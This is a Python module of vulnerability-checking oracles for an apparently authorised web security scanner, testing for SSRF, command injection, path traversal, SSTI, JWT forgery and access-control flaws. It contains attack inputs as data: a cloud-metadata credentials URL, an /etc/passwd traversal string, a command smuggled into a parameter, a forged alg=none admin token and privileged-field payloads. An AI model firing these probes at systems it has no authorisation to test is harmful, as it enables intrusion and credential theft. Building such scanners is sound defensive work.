"""Independent oracles for SSRF, command injection, and path traversal.

Same discipline as the other oracles: a probe signal is confirmed only against a benign
control and with 2+ reproductions. All probes are unauthenticated Tier-1 GETs with an inert
marker in the query string — nothing is actually fetched, executed, or read on the tester side.
"""

from __future__ import annotations

import json as _json
import random as _random
import re as _re

from .oracle import OracleVerdict
from .web_oracles import _collect

_SSRF_INTERNAL_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Cloud-metadata / IMDS *content* signature: tokens a real metadata response leaks (AWS/GCP/Azure),
# not a marker the demo happens to emit. A benign external fetch never contains these, and merely
# echoing the probe URL back does not either -> a reflecting endpoint cannot confirm SSRF.
_SSRF_SIGNATURE = _re.compile(
    r"(?i)(ami-id|instance-id|AccessKeyId|SecretAccessKey|\"Code\"\s*:\s*\"Success\"|"
    r"iam[-/ ]?role|computeMetadata|metadata\.google)"
)
_TRAVERSAL_PAYLOAD = "../../../../../../etc/passwd"
# Real file-content signature: a unix /etc/passwd root entry (uid:gid 0:0) or a Windows
# boot.ini / win.ini section banner. A reflected path (e.g. echoing "../../etc/passwd") contains
# none of these, so a reflecting endpoint no longer confirms traversal.
_TRAVERSAL_SIGNATURE = _re.compile(
    r"(?im)\broot:[^:\r\n]*:0:0:"  # unix /etc/passwd root line (uid:gid both 0)
    r"|\[boot loader\]"  # windows boot.ini
    r"|\[fonts\]"  # windows win.ini
    r"|;\s*for 16-bit app support"  # windows win.ini banner
)


def _sig_match(signature, body: str | None) -> bool:
    """Match a signature that is either a plain substring or a compiled regex."""
    text = body or ""
    if hasattr(signature, "search"):
        return bool(signature.search(text))
    return signature in text


def _marker_oracle(runner, hyp, *, vuln_class, probe_value, control_value, signature, reproductions):
    path, param = hyp["endpoint_path"], hyp["selector_param"]
    hid = hyp.get("id")
    probe = runner.get(
        path,
        session=None,
        query={param: probe_value},
        payload_class="boundary-probe",
        rationale=f"{vuln_class} probe",
        hypothesis_id=hid,
        summary=f"{vuln_class} probe",
    )
    control = runner.get(
        path,
        session=None,
        query={param: control_value},
        payload_class="boundary-probe",
        rationale=f"{vuln_class} benign control",
        hypothesis_id=hid,
        summary=f"{vuln_class} control",
    )
    if not probe.executed or not control.executed:
        return OracleVerdict(
            False, vuln_class, reasons=["probe blocked by policy"], evidence=_collect(probe, control)
        )

    probe_hit = _sig_match(signature, probe.body)
    control_hit = _sig_match(signature, control.body)
    reasons, fp = [], []
    reasons.append(
        ("PASS" if probe_hit else "FAIL")
        + f": attack value produced the {vuln_class} signature in the response"
    )
    reasons.append(("PASS" if not control_hit else "FAIL") + ": benign control did NOT produce the signature")
    fp.append(f"probe signature present={probe_hit}; control signature present={control_hit}")
    decisive = probe_hit and not control_hit

    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            r = runner.get(
                path,
                session=None,
                query={param: probe_value},
                payload_class="boundary-probe",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"{vuln_class} repro {i + 1}",
            )
            if r.executed and _sig_match(signature, r.body):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times from clean requests")

    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class=vuln_class,
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(probe, control),
        controls={"probe_hit": probe_hit, "control_hit": control_hit},
    )


def run_ssrf_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    return _marker_oracle(
        runner,
        hyp,
        vuln_class="SSRF",
        probe_value=_SSRF_INTERNAL_URL,
        control_value="https://example.com/",
        signature=_SSRF_SIGNATURE,
        reproductions=reproductions,
    )


def run_cmdi_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    """OS command injection via a COMPUTED proof the input cannot contain literally.

    The probe injects ``; echo $((A*B))`` with fresh random A,B each round. A shell evaluates the
    arithmetic expansion and emits the *product*; an endpoint that merely reflects input echoes the
    literal ``$((A*B))`` and never the product. Confirmation requires, every round: the product
    appears in the response, the product is NOT a substring of the probe value we sent (so
    reflection cannot explain it), and a benign control (``127.0.0.1``) response does not contain
    it. A,B are drawn in [100, 999], so the product is 5-6 digits while the longest contiguous digit
    run in the probe is 3 — the product can never be a substring of the payload by construction.
    """
    path, param = hyp["endpoint_path"], hyp["selector_param"]
    hid = hyp.get("id")

    control = runner.get(
        path,
        session=None,
        query={param: "127.0.0.1"},
        payload_class="boundary-probe",
        rationale="CMDI benign control (no injected command)",
        hypothesis_id=hid,
        summary="cmdi control",
    )

    def _probe(idx):
        a, b = _random.randint(100, 999), _random.randint(100, 999)
        expected = str(a * b)
        value = f"127.0.0.1; echo $(({a}*{b}))"
        resp = runner.get(
            path,
            session=None,
            query={param: value},
            payload_class="boundary-probe",
            rationale="CMDI probe: shell arithmetic expansion of a fresh random product",
            hypothesis_id=hid,
            summary=f"cmdi probe {idx}",
        )
        return expected, value, resp

    expected0, value0, probe = _probe(0)
    if not probe.executed or not control.executed:
        return OracleVerdict(
            False, "CMDI", reasons=["probe blocked by policy"], evidence=_collect(probe, control)
        )

    control_body = control.body or ""
    computed_present = expected0 in (probe.body or "")
    not_in_payload = expected0 not in value0  # the product is never literally in what we sent
    control_clean = expected0 not in control_body

    reasons, fp = [], []
    reasons.append(
        ("PASS" if computed_present else "FAIL")
        + f": the injected command computed the product ({expected0} present in the response)"
    )
    reasons.append(
        ("PASS" if not_in_payload else "FAIL")
        + ": the product is NOT a substring of the probe value sent (reflection cannot explain it)"
    )
    reasons.append(
        ("PASS" if control_clean else "FAIL") + ": the benign control response does not contain the product"
    )
    fp.append(
        f"product present={computed_present}; present-in-payload={not not_in_payload}; "
        f"control-contains={not control_clean}"
    )
    decisive = computed_present and not_in_payload and control_clean

    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            exp_i, val_i, r = _probe(i + 1)
            if (
                r.executed
                and (exp_i in (r.body or ""))
                and (exp_i not in val_i)
                and (exp_i not in control_body)
            ):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times with a fresh random product each run")

    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class="CMDI",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(probe, control),
        controls={
            "product": expected0,
            "computed_present": computed_present,
            "not_in_payload": not_in_payload,
            "control_clean": control_clean,
        },
    )


def run_traversal_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    return _marker_oracle(
        runner,
        hyp,
        vuln_class="PATH_TRAVERSAL",
        probe_value=_TRAVERSAL_PAYLOAD,
        control_value="readme.txt",
        signature=_TRAVERSAL_SIGNATURE,
        reproductions=reproductions,
    )


def _privileged_aggregate(body: str | None) -> bool:
    """Structural signal that a response is a privileged *aggregate*, not a trivial 200.

    True only when the body is JSON exposing a list of 2+ records (a top-level array, or a dict
    whose value is such a list — the shape a cross-tenant "all orders" report returns). A bare 200,
    a scalar body, an empty list, or a single-item payload does NOT qualify, so the oracle never
    confirms on an ordinary authenticated response.
    """
    try:
        doc = _json.loads(body or "")
    except (ValueError, TypeError):
        return False

    def _is_aggregate(value) -> bool:
        return isinstance(value, list) and len(value) >= 2

    if _is_aggregate(doc):
        return True
    if isinstance(doc, dict):
        return any(_is_aggregate(v) for v in doc.values())
    return False


_SENSITIVE_KEY = _re.compile(
    r'(?i)"(ssn|social_security|password|passwd|pwd|password_hash|secret|api[_-]?key|api[_-]?token|'
    r'access[_-]?token|private[_-]?key|credit[_-]?card|card[_-]?number|cvv|pan)"\s*:'
)


_HHI_CANARY = "rampart-hhi-canary.example"


def run_hostheader_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    """Host-header injection: a crafted Host header is reflected into links/body (password-reset
    poisoning, cache poisoning). Deterministic: the attacker host appears for the crafted Host and
    not for the legitimate one. All over GET — no state change."""
    path = hyp["endpoint_path"]
    hid = hyp.get("id")
    probe = runner.get(
        path,
        session=None,
        headers={"Host": _HHI_CANARY},
        payload_class="boundary-probe",
        rationale="host-header injection probe",
        hypothesis_id=hid,
        summary="hhi probe",
    )
    control = runner.get(
        path,
        session=None,
        payload_class="benign-read",
        rationale="control: legitimate Host",
        hypothesis_id=hid,
        summary="hhi control",
    )
    if not probe.executed or not control.executed:
        return OracleVerdict(
            False,
            "HOST_HEADER_INJECTION",
            reasons=["probe blocked by policy"],
            evidence=_collect(probe, control),
        )
    reflected = _HHI_CANARY in (probe.body or "")
    control_clean = _HHI_CANARY not in (control.body or "")
    reasons, fp = [], []
    reasons.append(("PASS" if reflected else "FAIL") + ": crafted Host header is reflected into the response")
    reasons.append(("PASS" if control_clean else "FAIL") + ": legitimate Host does not contain the canary")
    decisive = reflected and control_clean
    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            r = runner.get(
                path,
                session=None,
                headers={"Host": _HHI_CANARY},
                payload_class="boundary-probe",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"hhi repro {i + 1}",
            )
            if r.executed and _HHI_CANARY in (r.body or ""):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times")
    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class="HOST_HEADER_INJECTION",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(probe, control),
    )


_MA_ROLE_CANARY = "rampart-admin-canary"


def run_mass_assignment_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    """Mass assignment / BOPLA: a client-supplied privileged field is accepted and reflected back.
    Round-trip: POST a privileged field (canary) and confirm it persisted; a control without it does
    not. Requires the write channel (--active)."""
    path = hyp["endpoint_path"]
    hid = hyp.get("id")
    probe = runner.post(
        path,
        {"name": "rampart", "role": _MA_ROLE_CANARY, "is_admin": True},
        payload_class="canary",
        rationale="mass-assignment: inject privileged fields",
        hypothesis_id=hid,
        summary="mass-assign probe",
    )
    control = runner.post(
        path,
        {"name": "rampart"},
        payload_class="canary",
        rationale="control: no privileged fields",
        hypothesis_id=hid,
        summary="mass-assign control",
    )
    if not probe.executed or not control.executed:
        return OracleVerdict(
            False,
            "MASS_ASSIGNMENT",
            reasons=["probe blocked by policy (needs --active)"],
            evidence=_collect(probe, control),
        )
    accepted = _MA_ROLE_CANARY in (probe.body or "")
    control_clean = _MA_ROLE_CANARY not in (control.body or "")
    reasons, fp = [], []
    reasons.append(
        ("PASS" if accepted else "FAIL") + ": client-supplied privileged field was accepted/persisted"
    )
    reasons.append(("PASS" if control_clean else "FAIL") + ": control without the field did not contain it")
    decisive = accepted and control_clean
    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            r = runner.post(
                path,
                {"name": "rampart", "role": _MA_ROLE_CANARY, "is_admin": True},
                payload_class="canary",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"mass-assign repro {i + 1}",
            )
            if r.executed and _MA_ROLE_CANARY in (r.body or ""):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times")
    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class="MASS_ASSIGNMENT",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(probe, control),
    )


def run_graphql_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    """GraphQL introspection enabled: the schema is returned to an anonymous client."""
    path = hyp["endpoint_path"]
    hid = hyp.get("id")
    probe = runner.post(
        path,
        {"query": "{__schema{types{name}}}"},
        payload_class="benign-read",
        rationale="graphql introspection query",
        hypothesis_id=hid,
        summary="graphql probe",
    )
    control = runner.post(
        path,
        {"query": "{health}"},
        payload_class="benign-read",
        rationale="control: non-introspection query",
        hypothesis_id=hid,
        summary="graphql control",
    )
    if not probe.executed or not control.executed:
        return OracleVerdict(
            False,
            "GRAPHQL",
            reasons=["probe blocked by policy (needs --active)"],
            evidence=_collect(probe, control),
        )
    introspects = "__schema" in (probe.body or "")
    control_clean = "__schema" not in (control.body or "")
    reasons, fp = [], []
    reasons.append(("PASS" if introspects else "FAIL") + ": introspection query returned the schema")
    reasons.append(("PASS" if control_clean else "FAIL") + ": a non-introspection query did not")
    decisive = introspects and control_clean
    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            r = runner.post(
                path,
                {"query": "{__schema{types{name}}}"},
                payload_class="benign-read",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"graphql repro {i + 1}",
            )
            if r.executed and "__schema" in (r.body or ""):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times")
    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class="GRAPHQL",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(probe, control),
    )


def run_ssti_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    # Arithmetic differential: {{1337*1338}} evaluates to 1788906 only if the template engine runs it.
    return _marker_oracle(
        runner,
        hyp,
        vuln_class="SSTI",
        probe_value="{{1337*1338}}",
        control_value="1337*1338",
        signature="1788906",
        reproductions=reproductions,
    )


_JWT_CANARY = "rampart-admin-canary"


def _jwt_forge_none(sub: str) -> str:
    import base64 as _b64
    import json as _json

    def seg(obj):
        return _b64.urlsafe_b64encode(_json.dumps(obj).encode()).rstrip(b"=").decode()

    return seg({"alg": "none", "typ": "JWT"}) + "." + seg({"sub": sub, "role": "admin"}) + "."


def run_jwt_oracle(runner, hyp, reproductions: int = 2) -> OracleVerdict:
    """JWT accepted without signature verification (alg=none): forge an identity and get in,
    while the endpoint still rejects an unauthenticated request (so the defect is signature
    verification, not a missing auth check)."""
    path = hyp["endpoint_path"]
    hid = hyp.get("id")
    forged = _jwt_forge_none(_JWT_CANARY)
    probe = runner.get(
        path,
        session=None,
        headers={"Authorization": f"Bearer {forged}"},
        payload_class="boundary-probe",
        rationale="JWT probe: forged alg=none token with attacker-chosen identity",
        hypothesis_id=hid,
        summary="jwt forged",
    )
    unauth = runner.get(
        path,
        session=None,
        payload_class="benign-read",
        rationale="negative control: no token",
        hypothesis_id=hid,
        summary="jwt unauth",
    )
    if not probe.executed or not unauth.executed:
        return OracleVerdict(
            False, "JWT", reasons=["probe blocked by policy"], evidence=_collect(probe, unauth)
        )
    accepted = probe.status == 200 and _JWT_CANARY in (probe.body or "")
    auth_enforced = unauth.status in (401, 403)
    reasons, fp = [], []
    reasons.append(
        ("PASS" if accepted else "FAIL")
        + f": server accepted a forged alg=none token as '{_JWT_CANARY}' (status {probe.status})"
    )
    reasons.append(
        ("PASS" if auth_enforced else "FAIL")
        + f": unauthenticated request is rejected (status {unauth.status})"
    )
    decisive = accepted and auth_enforced
    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            r = runner.get(
                path,
                session=None,
                headers={"Authorization": f"Bearer {forged}"},
                payload_class="boundary-probe",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"jwt repro {i + 1}",
            )
            if r.executed and r.status == 200 and _JWT_CANARY in (r.body or ""):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times from clean requests")
    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class="JWT",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(probe, unauth),
        controls={"probe_status": probe.status, "unauth_status": unauth.status},
    )


def run_bfla_oracle(runner, sessions, hyp, reproductions: int = 2) -> OracleVerdict:
    """Broken function-level authorization, proven structurally (no response marker).

    Confirm only when the low-privilege authenticated principal gets a 200 carrying a privileged
    *aggregate* (JSON with a list of 2+ records — data a low-priv caller should never see in bulk)
    WHILE an unauthenticated request to the same function is rejected (401/403). That pair proves
    it is an auth-gated function AND that a low-priv principal reached privileged data. A public
    endpoint (unauth also 200) or a properly-restricted one (low-priv 403) no longer confirms, and
    a bare 200 is never enough.
    """
    path = hyp["endpoint_path"]
    actor = hyp["actor_principal"]
    hid = hyp.get("id")
    if sessions is not None:
        sessions.fresh_session(actor)
    authed = runner.get(
        path,
        session=actor,
        payload_class="boundary-probe",
        rationale="BFLA: low-privilege principal calls a privileged function",
        hypothesis_id=hid,
        summary="bfla authed",
    )
    unauth = runner.get(
        path,
        session=None,
        payload_class="benign-read",
        rationale="negative control: unauthenticated access",
        hypothesis_id=hid,
        summary="bfla unauth",
    )
    if not authed.executed or not unauth.executed:
        return OracleVerdict(
            False, "BFLA", reasons=["probe blocked by policy"], evidence=_collect(authed, unauth)
        )
    priv = authed.status == 200 and _privileged_aggregate(authed.body)
    auth_enforced = unauth.status in (401, 403)
    reasons, fp = [], []
    reasons.append(
        ("PASS" if priv else "FAIL")
        + f": low-priv principal '{actor}' received a privileged aggregate (status {authed.status})"
    )
    reasons.append(
        ("PASS" if auth_enforced else "FAIL")
        + f": the function still enforces authentication (unauth -> {unauth.status})"
    )
    decisive = priv and auth_enforced
    repro_ok = 0
    if decisive:
        for i in range(reproductions):
            if sessions is not None:
                sessions.fresh_session(actor)
            r = runner.get(
                path,
                session=actor,
                payload_class="boundary-probe",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"bfla repro {i + 1}",
            )
            if r.executed and r.status == 200 and _privileged_aggregate(r.body):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times from clean sessions")
    return OracleVerdict(
        validated=decisive and repro_ok >= reproductions,
        vuln_class="BFLA",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(authed, unauth),
        controls={"authed_status": authed.status, "unauth_status": unauth.status},
    )


def run_exposure_oracle(runner, sessions, hyp, reproductions: int = 2) -> OracleVerdict:
    """Excessive data exposure: an authenticated response includes sensitive fields (PII/secrets)."""
    path = hyp["endpoint_path"]
    actor = hyp["actor_principal"]
    hid = hyp.get("id")
    if sessions is not None:
        sessions.fresh_session(actor)
    resp = runner.get(
        path,
        session=actor,
        payload_class="boundary-probe",
        rationale="excessive data exposure: inspect returned fields",
        hypothesis_id=hid,
        summary="exposure probe",
    )
    if not resp.executed:
        return OracleVerdict(
            False, "EXCESSIVE_DATA", reasons=["probe blocked by policy"], evidence=_collect(resp)
        )
    matches = sorted({m.group(1).lower() for m in _SENSITIVE_KEY.finditer(resp.body or "")})
    hit = resp.status == 200 and bool(matches)
    reasons, fp = [], []
    reasons.append(
        ("PASS" if hit else "FAIL") + f": response exposes sensitive field(s): {', '.join(matches) or 'none'}"
    )
    repro_ok = 0
    if hit:
        for i in range(reproductions):
            r = runner.get(
                path,
                session=actor,
                payload_class="boundary-probe",
                rationale=f"reproduction #{i + 1}",
                hypothesis_id=hid,
                summary=f"exposure repro {i + 1}",
            )
            if r.executed and _SENSITIVE_KEY.search(r.body or ""):
                repro_ok += 1
        fp.append(f"reproduced {repro_ok}/{reproductions} times; fields: {', '.join(matches)}")
    return OracleVerdict(
        validated=hit and repro_ok >= reproductions,
        vuln_class="EXCESSIVE_DATA",
        reasons=reasons,
        false_positive_checks=fp,
        reproductions=repro_ok,
        evidence=_collect(resp),
        controls={"fields": matches, "status": resp.status},
    )
